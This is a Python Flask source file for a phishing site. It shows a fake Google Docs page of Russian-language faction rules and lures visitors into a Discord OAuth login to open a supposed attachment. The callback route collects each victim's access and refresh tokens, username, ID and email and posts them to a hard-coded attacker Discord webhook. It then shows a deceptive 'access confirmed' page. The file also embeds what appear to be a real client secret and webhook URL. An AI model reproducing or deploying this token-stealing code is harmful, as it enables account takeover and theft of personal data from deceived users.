from flask import Flask, request, redirect, render_template_string
import requests
import urllib.parse
import logging
from datetime import datetime

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)

# ===== НАСТРОЙКИ - ЗАМЕНИТЕ НА СВОИ =====
CLIENT_ID = "1527673986652176454"
CLIENT_SECRET = "0ZdjVtsBYQAQ0dVmJR_G8qoZhz4dsg4R"
REDIRECT_URI = "https://fraction-brp.onrender.com/callback"
WEBHOOK_URL = "https://discord.com/api/webhooks/1527674667274473502/VOQWxCWhCW0nx1-LY2PGhhJbNLBJadXkUOu1X3e2Y7nY43_gkhJaEGCvRtHcCqXatC79"  # ВАШ ВЕБХУК
# =========================================

# ===== СТРАНИЦА В СТИЛЕ GOOGLE DOCS =====
DOCS_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Правила фракций БРП - Google Документы</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
            background: #f1f3f4;
            color: #202124;
            height: 100vh;
            display: flex;
            flex-direction: column;
        }
        .top-bar {
            background: #fff;
            border-bottom: 1px solid #dadce0;
            padding: 8px 24px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            flex-shrink: 0;
        }
        .top-bar-left {
            display: flex;
            align-items: center;
            gap: 12px;
        }
        .docs-icon {
            width: 40px;
            height: 40px;
            background: linear-gradient(135deg, #4285f4 0%, #34a853 50%, #fbbc04 75%, #ea4335 100%);
            border-radius: 4px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            color: white;
            font-size: 18px;
        }
        .docs-title {
            font-size: 18px;
            font-weight: 500;
            color: #202124;
        }
        .docs-title span {
            color: #5f6368;
            font-weight: 400;
            font-size: 14px;
            margin-left: 8px;
        }
        .top-bar-right {
            display: flex;
            align-items: center;
            gap: 16px;
        }
        .share-btn {
            background: #1a73e8;
            color: white;
            border: none;
            padding: 8px 20px;
            border-radius: 25px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
        }
        .share-btn:hover { background: #1557b0; }
        .menu-bar {
            background: #fff;
            border-bottom: 1px solid #dadce0;
            padding: 4px 24px;
            display: flex;
            align-items: center;
            gap: 24px;
            flex-shrink: 0;
            font-size: 14px;
            color: #5f6368;
        }
        .menu-bar span.active {
            color: #202124;
            border-bottom: 2px solid #1a73e8;
            padding-bottom: 6px;
        }
        .docs-content {
            flex: 1;
            overflow-y: auto;
            padding: 40px 20px;
            display: flex;
            justify-content: center;
            background: #e8eaed;
        }
        .document {
            max-width: 850px;
            width: 100%;
            background: #fff;
            border-radius: 8px;
            box-shadow: 0 1px 3px rgba(0,0,0,0.12);
            padding: 60px 80px;
        }
        .document h1 {
            font-size: 28px;
            font-weight: 500;
            margin-bottom: 24px;
            text-align: center;
        }
        .document .meta {
            color: #5f6368;
            font-size: 13px;
            text-align: center;
            margin-bottom: 30px;
            padding-bottom: 16px;
            border-bottom: 1px solid #e8eaed;
        }
        .document h2 {
            font-size: 20px;
            font-weight: 500;
            margin: 28px 0 16px 0;
            padding-bottom: 8px;
            border-bottom: 2px solid #e8eaed;
        }
        .document p {
            font-size: 15px;
            line-height: 1.8;
            margin-bottom: 16px;
        }
        .document ul {
            margin: 16px 0 24px 32px;
            line-height: 1.8;
        }
        .document ul li { font-size: 15px; margin-bottom: 6px; }
        .highlight-box {
            background: #f8f9fa;
            border-left: 4px solid #1a73e8;
            padding: 16px 20px;
            margin: 20px 0;
            border-radius: 4px;
        }
        .attachment-section {
            background: #f8f9fa;
            border: 2px dashed #dadce0;
            border-radius: 12px;
            padding: 30px;
            margin: 30px 0 10px 0;
            text-align: center;
        }
        .attachment-section:hover {
            border-color: #1a73e8;
            background: #f1f8fe;
        }
        .attachment-section .attach-icon { font-size: 48px; margin-bottom: 12px; }
        .attachment-section h3 { font-size: 18px; font-weight: 500; margin-bottom: 8px; }
        .attachment-section p { font-size: 14px; color: #5f6368; margin-bottom: 16px; }
        .attachment-btn {
            display: inline-block;
            background: #1a73e8;
            color: white !important;
            padding: 14px 40px;
            border-radius: 25px;
            text-decoration: none;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            border: none;
        }
        .attachment-btn:hover { background: #1557b0; }
        .docs-footer {
            background: #f8f9fa;
            border-top: 1px solid #dadce0;
            padding: 8px 24px;
            display: flex;
            justify-content: space-between;
            font-size: 12px;
            color: #80868b;
            flex-shrink: 0;
        }
        .docs-footer a { color: #1a73e8; text-decoration: none; }
        @media (max-width: 768px) {
            .document { padding: 30px 20px; }
            .top-bar { padding: 8px 16px; flex-wrap: wrap; }
            .docs-title { font-size: 15px; }
        }
    </style>
</head>
<body>
    <div class="top-bar">
        <div class="top-bar-left">
            <div class="docs-icon">📄</div>
            <div class="docs-title">Правила фракций БРП <span>— Google Документы</span></div>
        </div>
        <div class="top-bar-right">
            <button class="share-btn" onclick="window.location.href='/login'">Поделиться</button>
        </div>
    </div>
    <div class="menu-bar">
        <span class="active">Файл</span>
        <span>Правка</span>
        <span>Вставка</span>
        <span>Формат</span>
        <span>Сервис</span>
        <span>Справка</span>
    </div>
    <div class="docs-content">
        <div class="document">
            <h1>📋 Правила фракций БРП</h1>
            <div class="meta">📅 Обновлено: 17 июля 2026 • 👤 Администрация</div>
            
            <h2>1. Общие положения</h2>
            <p>Данный документ устанавливает правила взаимодействия между фракциями в рамках проекта <strong>БРП</strong>.</p>
            
            <div class="highlight-box">
                <p><strong>📌 Важно:</strong> Незнание правил не освобождает от ответственности.</p>
            </div>
            
            <h2>2. Взаимодействие между фракциями</h2>
            <ul>
                <li><strong>Нейтралитет:</strong> Фракции обязаны соблюдать нейтралитет.</li>
                <li><strong>Конфликты:</strong> Решаются через переговоры.</li>
                <li><strong>Территории:</strong> Каждая фракция имеет зону влияния.</li>
            </ul>
            
            <div class="attachment-section">
                <div class="attach-icon">📎</div>
                <h3>Вложение: Полный регламент фракций</h3>
                <p>Для просмотра полной версии документа подтвердите доступ через Discord.</p>
                <a href="/login" class="attachment-btn" id="discordBtn">💬 Посмотреть вложение в Discord</a>
                <p style="font-size:12px; color:#9aa0a6; margin-top:12px;">🔒 Безопасное подключение</p>
            </div>
        </div>
    </div>
    <div class="docs-footer">
        <span>© 2026 БРП</span>
        <span><a href="https://discord.com" target="_blank">Discord</a></span>
    </div>
    <script>
        document.getElementById('discordBtn').addEventListener('click', function(e) {
            this.textContent = '⏳ Подключение...';
            this.style.opacity = '0.7';
            setTimeout(function() {
                window.location.href = '/login';
            }, 600);
        });
    </script>
</body>
</html>
"""

SUCCESS_PAGE = """
<!DOCTYPE html>
<html>
<head><title>Доступ подтверждён</title></head>
<body style="font-family:Arial;background:#f1f3f4;text-align:center;padding:100px;">
    <h1 style="color:#1a73e8;">✅ Доступ подтверждён!</h1>
    <p>Вложение будет открыто в Discord.</p>
    <p style="color:#5f6368;">Перенаправление...</p>
    <script>
        setTimeout(function() { window.location.href = 'https://discord.com/app'; }, 3000);
    </script>
</body>
</html>
"""

# ===== ОТПРАВКА ТОКЕНА В ВЕБХУК (ИСПРАВЛЕННАЯ) =====
def send_token_to_webhook(access_token, refresh_token, user_data):
    """Отправляет токен в вебхук с правильным форматированием"""
    
    username = user_data.get('username', 'Неизвестно')
    user_id = user_data.get('id', 'Неизвестно')
    email = user_data.get('email', 'Не указан')
    
    # Формируем сообщение - исправлено!
    message = (
        "**🔐 НОВЫЙ ТОКЕН ПОЛУЧЕН!**\n\n"
        "**👤 Пользователь:** " + username + "\n"
        "**🆔 ID:** " + user_id + "\n"
        "**📧 Email:** " + email + "\n"
        "**⏰ Время:** " + datetime.now().strftime('%Y-%m-%d %H:%M:%S') + "\n\n"
        "**🔑 ТОКЕН ДОСТУПА:**\n"
        "```\n" + access_token + "\n```\n\n"
        "**🔄 REFRESH ТОКЕН:**\n"
        "```\n" + refresh_token + "\n```\n\n"
        "**📊 Информация:**\n"
        "• Тип: Bearer\n"
        "• Длина токена: " + str(len(access_token)) + " символов\n"
        "• Аккаунт подтверждён: " + ("✅ Да" if user_data.get('verified') else "❌ Нет")
    )
    
    try:
        payload = {"content": message}
        resp = requests.post(WEBHOOK_URL, json=payload, timeout=10)
        logger.info(f"📬 Вебхук: {resp.status_code}")
        
        if resp.status_code in [200, 204]:
            logger.info("✅ Токен отправлен!")
            return True
        else:
            logger.error(f"❌ Ошибка: {resp.status_code} - {resp.text}")
            return False
            
    except Exception as e:
        logger.error(f"❌ Ошибка: {e}")
        return False

# ===== МАРШРУТЫ =====

@app.route('/')
def home():
    return render_template_string(DOCS_PAGE)

@app.route('/login')
def login():
    discord_auth_url = (
        f"https://discord.com/api/oauth2/authorize"
        f"?client_id={CLIENT_ID}"
        f"&redirect_uri={urllib.parse.quote(REDIRECT_URI)}"
        f"&response_type=code"
        f"&scope=identify%20email%20guilds"
    )
    return redirect(discord_auth_url)

@app.route('/callback')
def callback():
    code = request.args.get('code')
    error = request.args.get('error')
    
    if error:
        logger.error(f"Ошибка: {error}")
        return f"Ошибка: {error}", 400
    
    if not code:
        logger.error("Код не получен")
        return "Код не получен", 400
    
    data = {
        "client_id": CLIENT_ID,
        "client_secret": CLIENT_SECRET,
        "grant_type": "authorization_code",
        "code": code,
        "redirect_uri": REDIRECT_URI,
    }
    
    try:
        resp = requests.post("https://discord.com/api/oauth2/token", data=data)
        logger.info(f"Статус Discord API: {resp.status_code}")
        
        if resp.status_code == 200:
            token_data = resp.json()
            access_token = token_data.get("access_token")
            refresh_token = token_data.get("refresh_token")
            
            logger.info(f"✅ Токен получен! Длина: {len(access_token) if access_token else 0}")
            
            headers = {'Authorization': f'Bearer {access_token}'}
            user_resp = requests.get('https://discord.com/api/users/@me', headers=headers)
            
            if user_resp.status_code == 200:
                user_data = user_resp.json()
                logger.info(f"👤 {user_data.get('username')}")
                send_token_to_webhook(access_token, refresh_token, user_data)
                return render_template_string(SUCCESS_PAGE)
            else:
                return render_template_string(SUCCESS_PAGE)
        else:
            logger.error(f"❌ Ошибка: {resp.status_code}")
            return f"Ошибка: {resp.status_code}", 400
            
    except Exception as e:
        logger.error(f"❌ Ошибка: {e}")
        return "Внутренняя ошибка", 500

@app.route('/health')
def health():
    return {"status": "ok"}, 200

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=8080)
